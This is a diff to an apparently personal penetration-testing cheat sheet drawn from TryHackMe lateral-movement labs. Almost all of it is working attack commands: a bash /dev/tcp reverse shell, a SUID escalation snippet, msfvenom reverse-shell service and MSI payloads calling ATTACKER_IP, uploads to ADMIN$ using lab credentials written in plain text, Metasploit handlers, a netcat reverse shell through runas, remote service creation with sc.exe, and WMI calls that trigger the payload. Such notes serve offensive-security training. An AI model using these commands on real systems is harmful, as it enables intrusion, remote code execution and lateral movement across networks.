@@ -8,7 +8,9 @@ bash -i >& /dev/tcp/10.10.62.51/4545 0>&1
  
 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job:
 
-##########
+####################
+####################
+
 SUID Escalation Linux
 scrypt: c.c
     #include <stdio.h>
@@ -24,4 +26,67 @@ scrypt: c.c
 cmd:
     gcc c.c -o code
     chmod +x c.c
-##########
+
+####################
+####################
+
+Remotely Creating Services Using sc:
+
+    Metasploit Reverse shell:
+        ->msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
+
+    We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:
+        ->smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+
+    Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from msfconsole:
+        ->msfconsole
+        ->msf6 > use exploit/multi/handler
+        ->msf6 exploit(multi/handler) > set LHOST AttakerIP
+        ->msf6 exploit(multi/handler) > set LPORT 4444
+        ->msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+        ->msf6 exploit(multi/handler) > exploit 
+
+
+        ->nc -lvp 4443
+
+    Since sc.exe doesn't allow us to specify credentials as part of the command, we need to use runas to spawn a new shell with t1_leonard.summer's access token.
+    Windows Machine>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+
+    And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:
+        ->C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
+        ->C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+
+    After checl the listener on "msfconsole"
+
+####################
+####################
+
+Lateral Movement using MSI payload:
+    Creating our MSI payload
+        ->msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstallerPyaloadName.msi
+
+    We then copy the payload using SMB or any other method available:
+        ->smbclient -c 'put myinstallerPyaloadName.msi' -U userName -W ZA '//thmiis.za.tryhackme.com/admin$/' Password
+
+    Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.
+
+    We start a handler to receive the reverse shell from Metasploit:
+        ->msfconsole
+        ->msf6 > use exploit/multi/handler
+        ->msf6 exploit(multi/handler) > set LHOST AttakerIP
+        ->msf6 exploit(multi/handler) > set LPORT 4445
+        ->msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+        ->msf6 exploit(multi/handler) > exploit 
+
+    Let's start a WMI session against THMIIS from a Powershell console:
+        PS C:\> $username = 'userNam';
+        PS C:\> $password = 'Password';
+        PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+        PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+        PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+        PS C:\> $Session = New-Cimsession -ComputerName <ComputerName> -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+
+        We then invoke the Install method from the Win32_Product class to trigger the payload:
+        Powershell
+        PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstallerPyaloadName.msi"; Options = ""; AllUsers = $false}
